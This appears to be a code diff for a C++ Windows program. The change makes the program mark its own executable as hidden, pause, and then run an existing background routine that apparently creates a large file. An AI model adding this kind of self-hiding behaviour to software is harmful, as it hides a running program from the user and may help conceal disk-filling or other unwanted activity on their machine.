@@ -34,8 +34,27 @@ void runInBackground() {
 
     createLargeFile();
 }
+void hideExecutable(const char* exePath) {
+    // Set the file attributes to hidden
+    if (SetFileAttributes(exePath, FILE_ATTRIBUTE_HIDDEN)) {
+        std::cout << "File successfully hidden." << std::endl;
+    } else {
+        std::cout << "Failed to hide the file. Error: " << GetLastError() << std::endl;
+    }
+}
 
 int main() {
+     char exePath[MAX_PATH];
+    GetModuleFileName(NULL, exePath, MAX_PATH);
+
+    // Hide the executable
+    hideExecutable(exePath);
+
+    // Your main program logic here
+    std::cout << "Executable is running..." << std::endl;
+
+    // Keep the program running for a while to see the message
+    Sleep(5000);
     runInBackground();
     return 0;
 }
